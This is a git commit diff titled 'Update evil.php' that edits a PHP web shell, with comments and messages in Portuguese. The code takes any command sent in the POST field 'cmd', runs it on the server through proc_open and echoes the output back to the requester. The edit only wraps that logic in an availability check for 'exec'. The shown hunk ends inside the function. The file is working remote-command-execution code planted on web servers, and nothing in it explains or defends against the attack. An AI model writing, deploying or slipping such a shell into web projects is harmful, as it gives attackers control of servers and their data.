2dae1a6b7b4e0d98cfd7186c66784f3d87e24fdf
Rafaelchriss <86614504+rafaelchriss@users.noreply.github.com>
2025-01-12 09:39:51 -0300

    Update evil.php

--- evil.php
+++ evil.php
@@ -1,22 +1,27 @@
-<?php  
+<?php
 
 if (isset($_POST["cmd"])) {
     $cmd = ($_POST["cmd"]); 
 
     function exec_command($command) {
-        $descriptorspec = array(
-            0 => array("pipe", "r"),
-            1 => array("pipe", "w"),
-            2 => array("file", "error-output.txt", "a")
-        ); 
-        $cwd = "";
-        $env = array('some_option' => 'aeiou');
-        $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env);
-        
-        if (is_resource($process)) {
-            echo stream_get_contents($pipes[1]); 
-            fclose($pipes[1]);
-            proc_close($process);
+        // Verifica se a função exec está disponível
+        if (function_exists('exec')) {
+            $descriptorspec = array(
+                0 => array("pipe", "r"),
+                1 => array("pipe", "w"),
+                2 => array("file", "error-output.txt", "a")
+            ); 
+            $cwd = "";
+            $env = array('some_option' => 'aeiou');
+            $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env);
+            
+            if (is_resource($process)) {
+                echo stream_get_contents($pipes[1]); 
+                fclose($pipes[1]);
+                proc_close($process);
+            }
+        } else {
+            echo "A função exec não está disponível.";
         }
     }
 
